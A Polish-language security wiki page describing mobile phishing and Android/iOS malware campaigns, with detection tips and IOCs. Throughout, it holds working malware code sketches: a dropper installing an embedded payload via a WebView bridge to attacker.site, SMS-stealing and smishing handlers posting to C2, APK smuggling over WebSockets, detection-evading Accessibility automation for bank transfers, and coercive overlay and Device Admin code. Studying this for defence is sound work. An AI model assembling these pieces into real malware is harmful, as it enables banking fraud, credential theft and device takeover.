# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ta strona opisuje techniki używane przez threat actors do dystrybucji **malicious Android APKs** oraz **iOS mobile-configuration profiles** poprzez phishing (SEO, social engineering, fake stores, dating apps, itd.).
> Materiał jest zaadaptowany z kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Zarejestruj dziesiątki domen podobnych do oryginalnych (dating, cloud share, car service…).
– Używaj lokalnych słów kluczowych i emoji w elemencie `<title>`, aby rankować w Google.
– Hostuj *zarówno* Android (`.apk`) jak i iOS instrukcje instalacji na tej samej stronie docelowej.
2. **First Stage Download**
* Android: bezpośredni link do *unsigned* lub “third-party store” APK.
* iOS: `itms-services://` albo zwykły link HTTPS do malicious **mobileconfig** profile (patrz niżej).
3. **Post-install Social Engineering**
* Przy pierwszym uruchomieniu aplikacja prosi o **invitation / verification code** (iluzja ekskluzywnego dostępu).
* Kod jest wysyłany metodą **POST** przez HTTP do Command-and-Control (C2).
* C2 odpowiada `{"success":true}` ➜ malware kontynuuje.
* Sandbox / AV dynamic analysis, które nigdy nie podaje poprawnego kodu, widzi **brak malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Niebezpieczne uprawnienia są żądane dopiero **po pozytywnej odpowiedzi C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Nowsze warianty **usuwają `<uses-permission>` dla SMS z `AndroidManifest.xml`** ale zostawiają ścieżkę kodu Java/Kotlin, która czyta SMS przez reflection ⇒ obniża static score, a nadal działa na urządzeniach, które przyznają uprawnienie przez nadużycie `AppOps` albo starsze targety.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 wprowadził **Restricted settings** dla sideloaded apps: przełączniki Accessibility i Notification Listener są wyszarzone, dopóki użytkownik nie zezwoli jawnie na restricted settings w **App info**.
* Strony phishingowe i droppers teraz dostarczają instrukcje krok po kroku, aby **allow restricted settings** dla sideloaded app, a potem włączyć Accessibility/Notification access.
* Nowszy bypass polega na instalacji payload przez **session-based PackageInstaller flow** (ta sama metoda, której używają app stores). Android traktuje aplikację jak zainstalowaną ze store, więc Restricted settings nie blokuje już Accessibility.
* Wskazówka do triage: w dropperze grep dla `PackageInstaller.createSession/openSession` plus kod, który natychmiast przenosi ofiarę do `ACTION_ACCESSIBILITY_SETTINGS` lub `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* Aplikacja pokazuje niewinne widoki (SMS viewer, gallery picker) zaimplementowane lokalnie.
* Tymczasem exfiltruje:
- IMEI / IMSI, phone number
- Pełny zrzut `ContactsContract` (JSON array)
- JPEG/PNG z `/sdcard/DCIM` skompresowane przez [Luban](https://github.com/Curzibn/Luban) w celu zmniejszenia rozmiaru
- Opcjonalnie treść SMS (`content://sms`)
Payloads są **batch-zipped** i wysyłane przez `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Pojedynczy **mobile-configuration profile** może żądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd., aby zapisać urządzenie do supervision podobnego do “MDM”.
* Instrukcje social-engineering:
1. Otwórz Settings ➜ *Profile downloaded*.
2. Kliknij *Install* trzy razy (screenshots na stronie phishingowej).
3. Zaufaj unsigned profile ➜ attacker uzyskuje entitlement *Contacts* i *Photo* bez App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads mogą **przypiąć phishing URL do Home Screen** z branded ikoną/etykietą.
* Web Clips mogą działać na pełnym ekranie (**full-screen**) (ukrywa browser UI) i zostać oznaczone jako **non-removable**, zmuszając ofiarę do usunięcia profilu, aby usunąć ikonę.
9. **Network Layer**
* Zwykły HTTP, często na porcie 80 z HOST header typu `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (brak TLS → łatwe do wykrycia).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Podczas analizy malware zautomatyzuj fazę invitation code za pomocą Frida/Objection, aby dojść do malicious branch.
* **Manifest vs. Runtime Diff** – Porównaj `aapt dump permissions` z runtime `PackageManager#getRequestedPermissions()`; brakujące dangerous perms to red flag.
* **Network Canary** – Skonfiguruj `iptables -p tcp --dport 80 -j NFQUEUE`, aby wykrywać niesolidne POST bursty po wpisaniu kodu.
* **mobileconfig Inspection** – Użyj `security cms -D -i profile.mobileconfig` na macOS, aby wyświetlić `PayloadContent` i wykryć nadmierne entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Wskaźniki (ogólne)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Ten wzorzec zaobserwowano w kampaniach nadużywających motywów świadczeń rządowych do kradzieży indyjskich poświadczeń UPI i OTP. Operatorzy łączą renomowane platformy dla dostarczania i odporności.

### Łańcuch dostarczania przez zaufane platformy
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitujący legit portal
- Ten sam GitHub repo hostuje APK z fałszywą odznaką “Google Play” linkującą bezpośrednio do pliku
- Dynamic phishing pages działają na Replit; zdalny kanał command używa Firebase Cloud Messaging (FCM)

### Dropper z osadzonym payload i instalacją offline
- Pierwszy APK to installer (dropper), który zawiera prawdziwy malware w `assets/app.apk` i prosi użytkownika o wyłączenie Wi‑Fi/mobile data, aby osłabić cloud detection.
- Osadzony payload instaluje się pod niepozorną etykietą (np. “Secure Update”). Po instalacji zarówno installer, jak i payload są obecne jako osobne apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Malware pobiera zwykły tekst, przecinkowo rozdzieloną listę aktywnych endpointów z shortlink; proste transformacje stringów tworzą finalną ścieżkę strony phishingowej.

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Harvesting poświadczeń UPI oparte na WebView
- Krok „Make payment of ₹1 / UPI‑Lite” ładuje formularz HTML atakującego z dynamicznego endpointu wewnątrz WebView i przechwytuje wrażliwe pola (phone, bank, UPI PIN), które są `POST`owane do `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Samoreplikacja i przechwytywanie SMS/OTP
- Przy pierwszym uruchomieniu żądane są agresywne uprawnienia:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Contacts są zapętlane, aby masowo wysyłać smishing SMS z urządzenia ofiary.
- Incoming SMS są przechwytywane przez broadcast receiver i uploadowane wraz z metadanymi (sender, body, SIM slot, per-device random ID) do `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) jako resilient C2
- Payload rejestruje się w FCM; wiadomości push zawierają pole `_type` używane jako switch do wywoływania działań (np. aktualizacja phishing text templates, przełączanie behaviours).

Przykład payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK zawiera drugi payload w `assets/app.apk`
- WebView ładuje płatność z `gate.htm` i eksfiltruje do `/addup.php`
- Eksfiltracja SMS do `/addsm.php`
- Pobieranie konfiguracji sterowane shortlinkami (np. `rebrand.ly/*`) zwracającymi endpointy CSV
- Aplikacje oznaczone jako generyczne „Update/Secure Update”
- Wiadomości FCM `data` z dyskryminatorem `_type` w niezaufanych aplikacjach

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Atakujący coraz częściej zastępują statyczne linki do APK kanałem Socket.IO/WebSocket osadzonym w przynętach wyglądających jak Google Play. To ukrywa URL payloadu, omija filtry URL/rozszerzeń i zachowuje realistyczny UX instalacji.

Typowy przepływ klienta zaobserwowany w praktyce:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Dlaczego omija proste zabezpieczenia:
- Żaden statyczny URL do APK nie jest ujawniany; ładunek jest rekonstruowany w pamięci z ramek WebSocket.
- Filtry URL/MIME/rozszerzeń, które blokują bezpośrednie odpowiedzi .apk, mogą nie wykryć danych binarnych tunelowanych przez WebSockets/Socket.IO.
- Crawlers i sandboksy URL, które nie wykonują WebSockets, nie pobiorą ładunku.

Zobacz także WebSocket tradecraft i narzędzia:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Kampania bankowa/RAT RatOn (ThreatFabric) to konkretny przykład tego, jak nowoczesne operacje phishingu mobilnego łączą droppery WebView, automatyzację UI opartą na Accessibility, overlay/ransom, wymuszanie Device Admin, Automated Transfer System (ATS), przejęcie portfela crypto oraz nawet orkiestrację NFC-relay. Ta sekcja abstrahuje techniki, które można wielokrotnie wykorzystywać.

### Stage-1: WebView → native install bridge (dropper)
Atakujący prezentują WebView wskazujący na stronę atakującego i wstrzykują interfejs JavaScript, który udostępnia natywny instalator. Dotknięcie przycisku HTML wywołuje kod natywny, który instaluje APK drugiego etapu dołączone do assets droppera, a następnie uruchamia je bezpośrednio.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML na stronie:
```html
<button onclick="bridge.installApk()">Install</button>
```
Po instalacji dropper uruchamia payload za pomocą jawnie określonego package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Pomysł na hunting: niezaufane aplikacje wywołujące `addJavascriptInterface()` i ujawniające metody podobne do instalatora dla WebView; APK zawiera osadzony drugi payload w `assets/` i wywołuje Package Installer Session API.

### Lejek zgody: Accessibility + Device Admin + kolejne runtime prompts
Stage-2 otwiera WebView, który hostuje stronę „Access”. Jej przycisk wywołuje eksportowaną metodę, która prowadzi ofiarę do ustawień Accessibility i prosi o włączenie rogue service. Po uzyskaniu zgody malware używa Accessibility do automatycznego klikania kolejnych dialogów uprawnień runtime (contacts, overlay, manage system settings, etc.) oraz prosi o Device Admin.

- Accessibility programowo pomaga akceptować późniejsze monity, znajdując przyciski typu „Allow”/„OK” w node-tree i wysyłając kliknięcia.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Zobacz też:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatorzy mogą wydawać polecenia, aby:
- renderować pełnoekranowy overlay z URL, albo
- przekazać inline HTML, który jest ładowany do overlay WebView.

Prawdopodobne zastosowania: coercion (wpisanie PIN-u), otwieranie wallet w celu przechwycenia PIN-ów, komunikaty ransom. Utrzymuj polecenie, aby upewnić się, że permission overlay jest przyznane, jeśli go brakuje.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: okresowo zrzucaj Accessibility node tree, serializuj widoczne teksty/role/bounds i wysyłaj do C2 jako pseudo-screen (polecenia takie jak `txt_screen` jednorazowo i `screen_live` ciągle).
- High-fidelity: zażądaj MediaProjection i uruchom screen-casting/recording na żądanie (polecenia takie jak `display` / `record`).

### ATS playbook (bank app automation)
Mając JSON task, otwórz bank app, steruj UI przez Accessibility z użyciem mieszanki text queries i coordinate taps, i wpisz payment PIN ofiary, gdy pojawi się prośba.

Przykładowe task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Przykładowe teksty widoczne w jednym przepływie celu (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operatorzy mogą też sprawdzać/podnosić limity przelewów za pomocą poleceń takich jak `check_limit` i `limit`, które nawigują po UI limitów w podobny sposób.

### Crypto wallet seed extraction
Cele takie jak MetaMask, Trust Wallet, Blockchain.com, Phantom. Przepływ: unlock (ukradziony PIN lub podane hasło), przejdź do Security/Recovery, ujawnij/pokaż seed phrase, keylog/exfiltrate it. Wdroż selektory uwzględniające locale (EN/RU/CZ/SK), aby ustabilizować nawigację między językami.

### Device Admin coercion
API Device Admin są używane, aby zwiększyć szanse przechwycenia PIN-u i utrudnić życie ofierze:

- Immediate lock:
```java
dpm.lockNow();
```
- Wygaś bieżące poświadczenie, aby wymusić zmianę (Accessibility przechwytuje nowy PIN/hasło):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Wymuś odblokowanie bez biometrii, wyłączając funkcje biometryczne keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Wiele kontrolek DevicePolicyManager wymaga Device Owner/Profile Owner na nowszym Androidzie; niektóre buildy OEM mogą być mniej restrykcyjne. Zawsze zweryfikuj na docelowym OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 może instalować i uruchamiać zewnętrzny moduł NFC-relay (np. NFSkate), a nawet przekazać mu szablon HTML, aby prowadził ofiarę podczas relay. Umożliwia to zbliżeniowy cash-out dla card-present obok online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors increasingly blend Accessibility-driven automation with anti-detection tuned against basic behaviour biometrics. A recent banker/RAT shows two complementary text-delivery modes and an operator toggle to simulate human typing with randomized cadence.

- Discovery mode: enumerate visible nodes with selectors and bounds to precisely target inputs (ID, text, contentDescription, hint, bounds) before acting.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` directly on the target node (stable, no keyboard);
- Mode 2 – clipboard set + `ACTION_PASTE` into the focused node (works when direct setText is blocked).
- Human-like cadence: split the operator-provided string and deliver it character-by-character with randomized 300–3000 ms delays between events to evade “machine-speed typing” heuristics. Implemented either by progressively growing the value via `ACTION_SET_TEXT`, or by pasting one char at a time.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Nakładki blokujące do fraud obejmują:
- Renderuj pełnoekranowy `TYPE_ACCESSIBILITY_OVERLAY` z kontrolowaną przez operatora przezroczystością; utrzymuj go nieprzezroczystym dla ofiary, podczas gdy zdalna automatyzacja działa pod spodem.
- Komendy zwykle udostępniane: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimalna nakładka z regulowanym alfa:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Wielostopniowy Android dropper z mostkiem WebView, dekoderem stringów JNI i staged ładowaniem DEX

Analiza CERT Polska z 03 April 2026 dotycząca **cifrat** jest dobrym punktem odniesienia dla nowoczesnego Android loader dostarczanego przez phishing, gdzie widoczny APK to tylko instalacyjna powłoka. Wzorzec, który warto wykorzystać, nie polega na nazwie rodziny, lecz na tym, jak połączone są etapy:

1. Strona phishingowa dostarcza lure APK.
2. Stage 0 żąda `REQUEST_INSTALL_PACKAGES`, ładuje natywny `.so`, odszyfrowuje osadzony blob i instaluje stage 2 za pomocą **PackageInstaller sessions**.
3. Stage 2 odszyfrowuje kolejny ukryty asset, traktuje go jak ZIP i **dynamicznie ładuje DEX** dla finalnego RAT.
4. Finalny stage nadużywa Accessibility/MediaProjection i używa WebSockets do sterowania/danych.

### Mostek JavaScript WebView jako kontroler instalatora

Zamiast używać WebView wyłącznie do fałszywego brandingu, lure może ujawniać mostek, który pozwala lokalnej/zdalnej stronie fingerprintować urządzenie i uruchamiać natywną logikę instalacji:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Triage ideas:
- grep for `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` and remote phishing URLs used in the same activity
- watch for bridges exposing installer-like methods (`start`, `install`, `openAccessibility`, `requestOverlay`)
- if the bridge is backed by a phishing page, treat it as an operator/controller surface, not just UI

### Native string decoding registered in `JNI_OnLoad`

Jednym przydatnym wzorcem jest metoda Java, która wygląda niewinnie, ale w rzeczywistości jest podpięta przez `RegisterNatives` podczas `JNI_OnLoad`. W cifrat, decoder ignorował pierwszy znak, używał drugiego jako 1-bajtowego klucza XOR, dekodował resztę z hex i przekształcał każdy bajt jako `((b - i) & 0xff) ^ key`.

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Użyj tego, gdy widzisz:
- powtarzające się wywołania jednej natywnej metody Java dla URL-i, nazw pakietów lub kluczy
- `JNI_OnLoad` rozwiązujące klasy i wywołujące `RegisterNatives`
- brak znaczących plaintext strings w DEX, ale wiele krótkich, hex-podobnych stałych przekazywanych do jednego helpera

### Warstwowe staging payloadu: XOR resource -> zainstalowany APK -> zasób podobny do RC4 -> ZIP -> DEX

Ta rodzina używała dwóch warstw unpacking, które warto generycznie wykrywać:

- **Stage 0**: odszyfruj `res/raw/*.bin` kluczem XOR wyprowadzonym przez natywny decoder, a następnie zainstaluj plaintext APK przez `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: wyodrębnij niepozorny asset, taki jak `FH.svg`, odszyfruj go rutyną podobną do RC4, sparsuj wynik jako ZIP, a następnie załaduj ukryte pliki DEX

To jest silny wskaźnik rzeczywistego pipeline dropper/loader, ponieważ każda warstwa utrzymuje następną fazę poza zasięgiem podstawowego statycznego skanowania.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` oraz wywołania sesji `PackageInstaller`
- odbiorniki dla `PACKAGE_ADDED` / `PACKAGE_REPLACED`, aby kontynuować chain po instalacji
- zaszyfrowane blob-y w `res/raw/` lub `assets/` z rozszerzeniami innymi niż media
- `DexClassLoader` / `InMemoryDexClassLoader` / obsługa ZIP blisko własnych decryptorów

### Native anti-debugging przez `/proc/self/maps`

Natywny bootstrap skanował też `/proc/self/maps` w poszukiwaniu `libjdwp.so` i przerywał działanie, jeśli był obecny. To praktyczny wczesny test anti-analysis, ponieważ debugowanie oparte na JDWP pozostawia rozpoznawalną zmapowaną bibliotekę:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Pomysły na polowanie:
- grep native code / output dekompilatora dla `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- jeśli hooki Frida pojawiają się za późno, najpierw sprawdź `.init_array` i `JNI_OnLoad`
- traktuj anti-debug + string decoder + staged install jako jeden klaster, a nie niezależne findings

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
